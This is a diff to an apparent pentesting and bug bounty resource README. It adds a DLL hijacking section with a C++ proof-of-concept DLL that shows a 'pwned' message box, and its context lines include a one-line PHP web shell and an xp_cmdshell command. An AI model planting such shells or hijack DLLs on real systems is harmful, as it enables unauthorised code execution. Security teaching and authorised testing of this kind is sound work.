@@ -16,6 +16,7 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [XSS](#xss)
 - [SQLi](#sqli)
 - [PHP](#php)
+- [DLL Hijacking](#dll-hijacking)
 - [Network](#network)
 - [Linux](#linux)
 
@@ -40,8 +41,7 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 
 **Desktop Application Penetration Testing**
 - [testssl.sh](https://testssl.sh/) useful for checking outdated ciphers & co.
-- [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to see which DLLs are missing for an exe and do DLL Hijacking. Below the proper filters for this purpose.
-  <img src="https://raw.githubusercontent.com/seeu-inspace/easyg/main/img/procmon-config.png" alt="procmon-config">
+- [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to see which DLLs are missing for an exe and do DLL Hijacking
 - [Process Hacker](https://processhacker.sourceforge.io/) It helps to dump the exe memory and see what sensitive data is there
 - [VB Decompiler](https://www.vb-decompiler.org/products.htm) decompile an exe written in VB
 - [Sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck) check the signature of an executable
@@ -186,6 +186,32 @@ xp_cmdshell 'COMMAND';
 shell.php
 ```php
 <?php echo "Shell: ";system($_GET['cmd']); phpinfo();?>
+```
+
+### DLL Hijacking
+
+Using Process Monitor (you can find it in the section [Tools](#tools)) set the filters to find missing dlls.<br/><br/>
+  <img src="https://raw.githubusercontent.com/seeu-inspace/easyg/main/img/procmon-config.png" alt="procmon-config">
+
+After that, insert the dll in the position of the missing ones with the same name. An example of a dll:
+
+```c++
+#include <windows.h>
+
+BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    switch (dwReason)
+    {
+    case DLL_PROCESS_ATTACH:
+        MessageBox(NULL,
+            "success!!",
+            "pwned",
+            MB_ICONERROR | MB_OK
+        );
+        break;
+    }
+
+    return TRUE;
+}
 ```
 
 ### Network
